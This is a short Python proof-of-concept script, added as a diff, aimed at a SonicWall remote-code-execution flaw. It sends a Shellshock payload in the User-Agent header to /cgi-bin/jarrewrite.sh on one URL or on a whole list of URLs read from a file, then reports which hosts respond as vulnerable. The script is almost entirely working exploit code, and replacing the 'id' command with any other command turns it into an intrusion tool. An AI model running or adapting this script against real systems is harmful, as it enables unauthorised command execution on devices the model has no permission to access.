@@ -1,0 +1,68 @@
+import requests
+import urllib3
+import sys
+from urllib import parse
+
+
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+	print('baby test')
+
+def help():
+	print(' SonicWall RCE -h 查看帮助  ')
+	print(' SonicWall RCE -u 输入待检测url  ')
+	print(' SonicWall RCE -f 输入待检测文件  ')
+
+def poc(url):
+	path="/cgi-bin/jarrewrite.sh"
+	vulnurl=url + path
+	#print(vulnurl)
+	headers = {
+    "User-Agent": "() { :; }; echo ; /bin/bash -c id",      
+}
+	try:
+		res=requests.get(vulnurl,headers=headers,verify=False,timeout=5)
+		if "id" in res.text and res.status_code==200:
+			print(res.text+url+"is vuln 漏洞存在")
+		else:
+			print(url+"is not vuln 漏洞不存在")
+	except Exception as e:
+		print(e)
+
+def poc1(files):
+	for url in open(files):
+		url=url.strip()
+		path="/cgi-bin/jarrewrite.sh"
+		vulnurl=url + path
+		#print(vulnurl)
+		headers = {
+        "User-Agent": "() { :; }; echo ; /bin/bash -c id",      
+    }
+		try:
+			res=requests.get(vulnurl,headers=headers,verify=False,timeout=5)
+			if "id" in res.text and res.status_code==200:
+				print("[*] "+res.text+url+"is vuln 漏洞存在")
+			else:
+				print("[*] "+url+"is not vuln 漏洞不存在")
+		except Exception as e:
+			print(e)
+
+if __name__ == '__main__':
+    try:
+    	banner()
+    	print('by baby')
+    	cmd1=sys.argv[1]
+
+    	if cmd1=='-h':
+    		help()
+    	elif cmd1=='-u':
+    		cmd2=sys.argv[2]
+    		poc(cmd2)
+    	elif cmd1=='-f':
+    		cmd2=sys.argv[2]
+    		poc1(cmd2)
+    	else:
+    		print("请输入正确参数，或者-h查看帮助")
+    except:
+    	print("输入-h查看帮助")
